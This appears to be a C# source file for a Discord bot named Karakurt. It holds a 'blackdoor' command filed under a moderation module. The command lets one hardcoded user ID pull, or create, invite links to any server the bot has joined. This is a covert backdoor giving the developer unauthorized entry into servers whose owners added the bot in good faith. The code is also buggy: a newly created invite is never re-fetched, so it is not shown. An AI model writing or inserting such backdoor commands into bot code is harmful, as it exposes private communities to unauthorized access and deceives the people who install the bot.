using Discord;
using Discord.Commands;
using Discord.WebSocket;
using Microsoft.Extensions.DependencyInjection;
using System;
using System.Linq;
using System.IO;
using System.Reflection;
using System.Threading.Tasks;
using System.Windows.Input;

namespace Karakurt.Core.Moderetion
{
    class Blackdoor : ModuleBase<SocketCommandContext>
    {
        [Command("blackdoor"), Summary("Get the invite of a server")]
        public async Task BlackdoorModule(ulong GuildId)
        {
            if (!(Context.User.Id == 369234431904579585))
            {
                await Context.Channel.SendMessageAsync(":x: You are not a bot maderation!:");
                return;
            }
            if (Context.Client.Guilds.Where(x => x.Id == GuildId).Count() < 1)
            {
                await Context.Channel.SendMessageAsync(":x: You an not in a guild with id" + GuildId);
                return;
            }
            SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildId).FirstOrDefault();
            var Invites = await Guild.GetInvitesAsync();
            if (Invites.Count() < 1)
            {
                try
                {
                    await Guild.TextChannels.First().CreateInviteAsync();
                }
                catch(Exception ex)
                {
                    await Context.Channel.SendMessageAsync($":x: Creating on invite for guild{Guild.Name} went wrong with error ``{ex.Message}``");
                    return;
                }
            }
                EmbedBuilder Embed = new EmbedBuilder();
            Embed.WithAuthor($"Invites for gild {Guild.Name}", Context.User.GetAvatarUrl(), Context.User.Activity.Name);
            Embed.WithColor(40, 200, 150);
            Embed.WithDescription("Приятно проведи у нас время!" + "[**Karakurt v.0.1.4** 2018г.-2019г. by Nodius](https://vk.com/timnazar)");
            foreach (var Current in Invites)
                Embed.AddField("Inviter:", $"[Inviter]({Current.Url})");
            await Context.Channel.SendMessageAsync("",false,Embed.Build());
        }
    }
}
